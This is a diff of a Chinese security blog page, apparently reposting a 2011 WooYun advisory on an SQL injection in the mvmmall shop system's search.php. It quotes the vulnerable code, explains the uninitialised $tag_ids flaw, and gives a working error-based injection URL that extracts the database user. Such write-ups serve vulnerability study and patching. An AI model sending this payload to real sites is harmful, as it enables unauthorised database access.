@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        wooyun-1000php-14 · \xeb\xfe&#39;s Blog
+        mvmmall网店商城系统注入漏洞-2011.07 · \xeb\xfe&#39;s Blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -118,7 +118,7 @@ white-space: pre;
                 <a href="/" >\xeb\xfe&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">wooyun-1000php-14</a>
+                <a href="#" class="post-name">mvmmall网店商城系统注入漏洞-2011.07</a>
             </div>
     </div>
     
@@ -139,7 +139,7 @@ white-space: pre;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            wooyun-1000php-14
+            mvmmall网店商城系统注入漏洞-2011.07
             <!-- 404 -->
             
         </h1>
@@ -155,9 +155,15 @@ white-space: pre;
         
             <!-- 文章页标签  -->
             
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = wooyun-1000php>wooyun-1000php</a>
+    
+</div>
+            
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2017/12/09</span>
+                <span class="post-intro-time">2017/12/10</span>
             </div>
         
     </div>
@@ -228,23 +234,21 @@ white-space: pre;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>mvmmall网店商城系统SQL注入0day问题出在搜索search.php这个文件上。</p>
+<h3 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> ‘<span class="keyword">include</span>/common.inc.php’;</span><br><span class="line"><span class="keyword">require_once</span> ROOTPATH.’header.php’;</span><br><span class="line"><span class="keyword">if</span>($action!=’search’)&#123;</span><br><span class="line">$search_key = ”;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($ps_search))</span><br><span class="line">&#123; <span class="comment">//省略一堆东西</span></span><br><span class="line">	$tag_ids = <span class="keyword">array</span>(); <span class="comment">//在if里</span></span><br><span class="line">	<span class="comment">//继续省略</span></span><br><span class="line">	<span class="keyword">while</span> ($row = $db-&gt;fetch_array($result)) &#123;</span><br><span class="line">	$tag_ids[] = $row[<span class="string">'goods_id'</span>];</span><br><span class="line">	&#125; <span class="comment">//也是在if里</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//省略一堆东西</span></span><br><span class="line">&#125; <span class="comment">//结束if里的东西</span></span><br><span class="line"><span class="comment">//商品标签搜索</span></span><br><span class="line">$tag_ids = array_unique($tag_ids); <span class="comment">//没有ps_search他就没初始化！可自行输入</span></span><br><span class="line">$tag_search = implode(‘,’,dhtmlchars($tag_ids)); <span class="comment">//dhtmlchars过滤HTML标签不用理会</span></span><br><span class="line">$tag_search &amp;&amp; $tag_search = “<span class="keyword">OR</span> uid IN($tag_search)”; <span class="comment">//呼…..成功了！</span></span><br><span class="line"><span class="comment">//省略无关东西</span></span><br><span class="line">$search_sql = “WHERE upv = ’<span class="number">1</span>′ <span class="keyword">AND</span> up_date&lt;=’$m_now_time’”.” <span class="keyword">AND</span> (( <span class="number">1</span> ” . $cat_search . $search_key . $brand_search . $min_search . $max_search .” ) “.$tag_search.” )”;<span class="comment">//没有单引号的….</span></span><br><span class="line">$total_count = $db-&gt;counter($mvm_goods_table,$search_sql);</span><br></pre></td></tr></table></figure>
+<p>根据程序逻辑，如果ps_search存在就进行if处理，没有ps_search就没其他处理，因此$tag_ids没进行初始化，我们可以自行输入，$tag_ids也没有进行SQL特殊字符过滤，dhtmlchars过滤html标签对构造语句没影响，注入语句中也没有单引号。</p>
+<h3 id="漏洞payload"><a href="#漏洞payload" class="headerlink" title="漏洞payload"></a>漏洞payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://URL/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from(select%20count(*),concat((select%20(select%20user())%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23</span><br></pre></td></tr></table></figure>
+<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-01732.html" target="_blank" rel="noopener">mvmmall网店商城系统注入漏洞-2011.07</a></p>
+
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
-            <li class="next">
-                <a href= "/2017/12/09/wooyun-1000php-15/" title= wooyun-1000php-15 >
-                    <span>往前一页</span>
-                    <span>wooyun-1000php-15</span>
-                </a>
-            </li>
-        
         
             <li class="previous">
-                <a href= "/2017/12/08/wooyun-1000php-13/" title= dedecms v5.3-v5.6 Get Shell >
+                <a href= "/2017/12/10/wooyun-1000php-15/" title= fckeditor >= 2.6.4 任意文件上传漏洞 >
                     <span>往后一页</span>
-                    <span>dedecms v5.3-v5.6 Get Shell</span>
+                    <span>fckeditor >= 2.6.4 任意文件上传漏洞</span>
                 </a>
             </li>
         
@@ -252,17 +256,27 @@ white-space: pre;
     <!-- 评论插件 -->
     <!-- 来必力City版安装代码 -->
 
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMjI3OC84ODQy>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
 <!-- City版安装代码已完成 -->
     
     
     <!--PC版-->
 
     <!--PC版-->
-
-	<!-- UY BEGIN -->
-	<div id="uyan_frame"></div>
-	<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2151445"></script>
-	<!-- UY END -->
 
 
     
@@ -312,7 +326,7 @@ white-space: pre;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详细说明"><span class="toc-number">2.</span> <span class="toc-text">详细说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞payload"><span class="toc-number">3.</span> <span class="toc-text">漏洞payload</span></a></li></ol>
     </div>
     
     <div class="back-top">&#xe639;</div>
@@ -546,24 +560,7 @@ white-space: pre;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    <div class="total-archive" >目前才写: 17 篇博文，好好努力吧，骚年。 </div>
+    <div class="total-archive" >目前才写: 18 篇博文，好好努力吧，骚年。 </div>
     
     <div class="post-archive">
     
@@ -575,32 +572,22 @@ white-space: pre;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2017/12/09/wooyun-1000php-14/" >wooyun-1000php-14</a>
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-16/" >mvmmall网店商城系统注入漏洞-2011.07</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2017/12/09/wooyun-1000php-15/" >wooyun-1000php-15</a>
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-15/" >fckeditor >= 2.6.4 任意文件上传漏洞</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-14/" >PHPCMS V9 通行证注册缺陷</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
         </li>
     
     
@@ -615,7 +602,17 @@ white-space: pre;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
         </li>
     
     
@@ -631,6 +628,11 @@ white-space: pre;
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
         </li>
     
     
@@ -663,9 +665,9 @@ white-space: pre;
         <div class="sidebar-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
-    
         <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
     
     </div>
     <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
